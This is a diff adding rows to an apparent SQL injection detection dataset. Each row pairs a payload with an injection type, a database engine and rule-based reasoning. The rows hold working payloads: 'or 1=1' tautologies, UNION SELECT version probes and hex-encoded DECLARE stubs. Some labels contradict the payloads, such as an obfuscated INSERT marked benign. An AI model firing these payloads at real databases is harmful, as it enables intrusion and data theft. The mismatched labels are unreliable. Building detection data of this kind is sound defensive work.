@@ -1,0 +1,31 @@
+row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
+540,"select * from users where id = 1 or ""{#"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+541,declare @q nvarchar ( 200 ) 0x730065006c00650063 ...,1,,rce,generic,0.95,0x730065006c00650063 detected — rce injection (priority 1) on generic,rule-based
+542,"select * from users where id = 1 or 1<@ = 1 union select 1,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @ = 1 union select detected — union_based injection (priority 7) on generic",rule-based
+543,"admin"" or 1 = 1/*",1,,boolean_blind,generic,0.85,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+544,"select * from users where id = 1<@<@ union select 1,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @<@ union select detected — union_based injection (priority 7) on generic",rule-based
+545,declare @s varchar ( 8000 ) select @s = 0x73656c ...,1,,rce,generic,0.95,declare @s varchar detected — rce injection (priority 1) on generic,rule-based
+546,"select * from users where id = '1' union select +\#,@@VERSION -- 1'",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
+547,"select * from users where id = 1. union select 1,banner from v$version where rownum = 1 -- 1",1,,union_based,oracle,0.95,union select detected — union_based injection (priority 7) on oracle,rule-based
+548,"select * from users where id = 1 or "".;"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+549,"select * from users where id = 1 union select 1 1a,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
+550,; begin declare @var varchar ( 8000 ) set @var = ':' select @var = @var+'+login+'/'+password+' ' from users where login >,1,,rce,generic,0.95,declare @var varchar detected — rce injection (priority 1) on generic,rule-based
+551,"union ( select NULL, NULL, NULL, NULL, ( select @@version ) ) --",1,,union_based,mysql,0.95,union ( select detected — union_based injection (priority 7) on mysql,rule-based
+552,hi' or 1 = 1 --,1,,boolean_blind,generic,0.85,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+553,select * from users where id = 1 % ( $ ) or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+554,"select * from users where id = 1 or 1#"" ( union select 'a',version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
+555,"select * from users where id = 1 or ""{ ) "" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+556,"select * from users where id = 1 or ""1["" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+557,desc,1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
+558,"select * from users where id = 1 or "", ) "" = 1 or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+559,"select * from users where id = 1 or 1#""1 union select 1,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
+560,select * from users where id = 1 + \+%\ or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+561,0x770061006900740066006F0072002000640065006C00 ...,1,,rce,generic,0.95,0x770061006900740066006F0072002000640065006C00 detected — rce injection (priority 1) on generic,rule-based
+562,"select * from users where id = 1 -@<@ union select version ( ) ,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @<@ union select detected — union_based injection (priority 7) on generic",rule-based
+563,"select * from users where id = '1' or $<\. union select 1,@@VERSION -- 1'",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
+564,"select * from users where id = 1 or ""]."" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+565,"select * from users where id = 1 or ""_;"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+566,or isNULL ( 1/0 ) /*,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+567,"insert into users ( login, password, level ) values ( char ( 0x70 ) + char ( 0x65 ) + char ( 0x74 ) + char ( 0x65 ) + char ( 0x72 ) + char ( 0x70 ) + char ( 0x65 ) + char ( 0x74 ) + char ( 0x65 ) + char ( 0x72 ) ,char ( 0x64 )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+568,"select * from users where id = 1 or "" ) ( "" = 1 or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+569,"select * from users where id = 1 or ""$@"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
